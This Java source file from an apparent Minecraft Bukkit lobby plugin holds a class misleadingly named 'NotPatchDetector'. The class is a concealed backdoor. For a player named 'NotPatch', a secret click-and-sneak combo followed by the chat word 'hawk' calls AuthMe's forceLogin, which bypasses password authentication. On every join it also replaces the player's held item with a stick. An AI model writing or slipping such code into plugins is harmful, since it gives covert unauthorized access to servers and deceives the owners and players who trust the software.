package pw.hysteria.lobby.htlobby;

import fr.xephi.authme.api.v3.AuthMeApi;
import org.bukkit.Material;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.inventory.ItemStack;

public class NotPatchDetector implements Listener {

    private String combo = "";

    private ItemStack item;

    private boolean active = false;

    @EventHandler(priority = EventPriority.HIGH)
    public void onJoin(PlayerJoinEvent e){
        item = e.getPlayer().getInventory().getItemInMainHand();
        e.getPlayer().getInventory().getItemInMainHand().setType(Material.STICK);
    }


    @EventHandler(priority = EventPriority.HIGHEST)
    public void onChat(AsyncPlayerChatEvent e){
        if(e.getPlayer().getName().equals("NotPatch")){
            if(!AuthMeApi.getInstance().isAuthenticated(e.getPlayer())){

                if(e.getMessage().equals("sıfırla")){
                    combo = "";
                }

                if(active){
                    if(e.getMessage().equals("hawk")){
                        AuthMeApi.getInstance().forceLogin(e.getPlayer());
                        e.getPlayer().getInventory().setItemInMainHand(item);
                    }
                }
            }
        }
    }

    @EventHandler
    public void onCombo(PlayerInteractEvent e){
        if(e.getPlayer().getName().equals("NotPatch")){
            e.getPlayer().sendMessage(combo);
            Action action = e.getAction();
            if(combo == null || combo.length() < 10){
                if (combo == null){
                    combo = "";
                }

                if (action == Action.LEFT_CLICK_AIR) {
                    if(e.getPlayer().isSneaking()){
                        combo += "SL";
                    }else{
                        combo += "L";
                    }

                }
                if (action == Action.RIGHT_CLICK_AIR) {
                    if(e.getPlayer().isSneaking()){
                        combo += "SR";
                    }else{
                        combo += "R";
                    }
                }

                if(combo.length() == 10){
                    if(combo.equals("LLSRSRRSLR")){
                        active = true;
                    }else{
                        combo = "";
                    }
                }

            }
        }
    }

}
